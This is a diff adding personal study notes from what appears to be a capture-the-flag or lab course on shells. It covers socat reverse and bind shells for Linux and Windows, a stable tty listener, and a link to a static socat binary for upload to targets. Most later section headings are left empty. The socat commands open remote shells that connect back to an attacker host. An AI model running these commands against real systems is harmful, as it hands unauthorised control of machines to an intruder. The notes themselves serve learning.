@@ -44,12 +44,91 @@ Have to write a script or look how to add it properly in my routine or try socat
 Answer:stty cols 238,sudo python3 -m http.server 80
 
 6.Socat 
+
+probably gonna try to implement socat more into my basic knowledge since it allows interactive commands and has a more stable shell
+
+Reverse Shell:
+
+The basic command for the listener,try to use the more stable one later on:
+socat TCP-L:<port> 
+
+Linux i guess we go on the bash command 
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+
+Windows command, makes sense since we wanna powershell 
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+
+Bind Shell:
+
+Linux
+socat TCP-L:<PORT> EXEC:"bash -li"
+
+Windows
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+
+Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
+socat TCP:<TARGET-IP>:<TARGET-PORT> -
+
+Little remainder for Bind/Reverse Shell:
+In a reverse shell, the remote machine initiates the connection and sends a request to connect to the target machine. 
+In a bind shell, the target machine listens for incoming connections and provides a shell interface when a connection is 
+established.
+
+Why reverse shells are used more for bypassing.
+With a reverse shell, attackers can often bypass security controls, like firewalls. While firewalls may prevent bind shell 
+attacks because they filter incoming traffic, they often provide fewer limits for outgoing connections, meaning they won't 
+capture the malicious activity.
+
+The more stable listener
+socat TCP-L:<port> FILE:`tty`,raw,echo=0 
+
+Explanation for tty,who command 
+https://www.howtogeek.com/428174/what-is-a-tty-on-linux-and-how-to-use-the-tty-command/
+
+The first listener can be connected to with any payload; however, this special listener must be activated with a very specific 
+socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, 
+however, it's possible to upload a precompiled socat binary, which can then be executed as normal.
+
+When u need to get the precompiled socat binary
+https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
+
+The command to connect back to the listener
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+Answer:TCP-L:8080
+
 7.Socat Encrypted Shells
+
+
 8.Common Shell Payloads
+
+
+
 9.msfvenom
+
+
+
 10.Metasploit multi/handler
+
+
+
 11.WebShells
+
+
+
 12.Next Steps
+
+
+
 13.Practice and Examples
+
+
+
 14.Linux Practice Box
+
+
+
 15.Windows Practice Box
+
+
+
